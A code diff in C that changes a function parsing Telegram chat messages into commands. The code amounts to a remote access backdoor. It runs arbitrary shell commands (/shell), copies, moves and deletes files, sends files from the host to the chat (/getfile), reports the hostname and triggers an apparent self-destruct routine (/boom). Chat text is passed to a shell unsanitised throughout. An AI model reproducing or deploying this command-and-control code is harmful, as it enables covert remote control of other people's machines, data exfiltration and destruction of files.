@@ -213,6 +213,7 @@ void changecommand(char *id,char *text,char *pName) {
     char path[4000];
     int start_index, index = 0, length;
     int space_loc;
+    int space_found=-1;
     bzero(command,4000);
     bzero(cmdArg,4000);
     // printf("b4 getpath\n");
@@ -223,97 +224,81 @@ void changecommand(char *id,char *text,char *pName) {
     for(start_index=0; start_index < length; start_index++) {
         if(text_build[start_index] == ' ' ){
             space_loc = start_index;
+            space_found = 1;
             break;
+        }
+    }
+    if(strchr(text_build,' ') == NULL){
+        space_found = -1;
+        if(strcmp(text_build,"/shell") == 0){
+            telegram_send_msg(id,"/shell <Unix-commad>");
+            // printf("argument not found,\n");
+        }
+        else if(strcmp(text_build,"/cp") == 0){
+            telegram_send_msg(id,"/cp [Option] <Source> <Destination>\n");
+        }
+        else if(strcmp(text_build,"/mv") == 0){
+            telegram_send_msg(id,"/mv [Option] <Source> <Destination>\n");            
+        }
+        else if(strcmp(text_build,"/rm") == 0){
+            telegram_send_msg(id,"/rm [OPTION] <File>\n");         
+        }
+        else if(strcmp(text_build,"/mkdir") == 0){
+            telegram_send_msg(id,"/mkdir [OPTION] <Directory>\n");
+        }
+        else if(strcmp(text_build,"/getfile") == 0){
+            telegram_send_msg(id,"/getfile <File>\n");         
+        }
+        else if(strcmp(text_build,"/boom") == 0){
+            boom(path,pName);           
+        }
+        else if(strcmp(text_build,"/gethostname") == 0){
+            getHostname(text_build);
+            telegram_send_msg(id,text_build);          
         }
     }
     // printf("b4 cut string\n");
     strncpy(command,text_build+1,space_loc);
     command[space_loc-1] = '\0';
-    printf("%s\n",command);
     strncpy(cmdArg, text_build+space_loc,length-space_loc);
     cmdArg[length-space_loc] = '\0';
-    if(strlen(cmdArg) > 0){
-        printf("%s",cmdArg);
-    }
+
     bzero(text_build,4000);
-    if(strcmp(command, "shell") == 0)
+    if(strcmp(command, "shell") == 0 && space_found != -1)
     {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/shell <Unix-commad>");
-        }
-        else{
-            sprintf(text_build, "%s",cmdArg);
-            exeCMD(text_build);
-        }
+        sprintf(text_build, "%s",cmdArg);
+        exeCMD(text_build);
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    else if(strcmp(command, "cp") == 0)
+    else if(strcmp(command, "cp") == 0 && space_found != -1)
     {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/cp [Option] <Source> <Destination>\n");
-        }
-        else{
-            sprintf(text_build, "%s%s",command,cmdArg);
-            exeCMD(text_build);
-        }
-        // strcpy(command_detail, "Exec shell commands with timeout.");
-    }
-    else if(strcmp(command, "mv") == 0)
-    {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/mv [Option] <Source> <Destination>\n");
-        }
-        else{
-            sprintf(text_build, "%s%s",command,cmdArg);
-            exeCMD(text_build);
-        }
-        // strcpy(command_detail, "Exec shell commands with timeout.");
-    }
-    else if(strcmp(command, "rm") == 0)
-    {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/rm [OPTION] <File>\n");
-        }
-        else{
+        printf("%d",space_found);
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
-        }
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    else if(strcmp(command, "mkdir") == 0)
+    else if(strcmp(command, "mv") == 0  && space_found != -1)
     {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/mkdir [OPTION] <Directory>\n");
-        }
-        else{
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
-        }
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    else if(strcmp(command, "getfile") == 0)
+    else if(strcmp(command, "rm") == 0  && space_found != -1)
     {
-        if(strlen(cmdArg) <= 0)
-        {
-            telegram_send_msg(id,"/getfile <File>\n");
-        }
-        else{
-            telegram_send_file(id,cmdArg);
-        }
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    else if(strcmp(command, "boom") == 0)
+    else if(strcmp(command, "mkdir") == 0  && space_found != -1)
     {
-        boom(path,pName);
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    else if(strcmp(command, "gethostname") == 0) {
-        getHostname(text_build);
-        telegram_send_msg(id,text_build);
+    else if(strcmp(command, "getfile") == 0  && space_found != -1)
+    {
+        telegram_send_file(id,cmdArg);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
     }
 
 }
